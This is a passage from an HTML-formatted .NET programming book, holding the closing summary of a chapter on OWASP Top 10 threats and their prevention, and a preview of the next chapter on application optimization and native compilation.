</pre></div></li></ul></div><p>Remember that this type of behavior is common in web development.</p></div>
<div class="section" title="Summary" id="aid-29DRA1"><div class="titlepage"><div><div><h1 class="title"><a id="ch11lvl1sec71"/>Summary</h1></div></div></div><p>In this chapter, we went through the OWASP Top 10 initiative, analyzing the risks and consequences of each of the threats, along with the possible prevention methods.</p><p>We also included some code for those threats that are either already addressed in Visual Studio templates or are easily implemented and are common in use.</p><p>In the next chapter, we will cover the optimization of applications and the different techniques that .NET offers for compilation to native code, optimization via the configuration of the assemblies, parallelism, and so on.</p></div></body></html>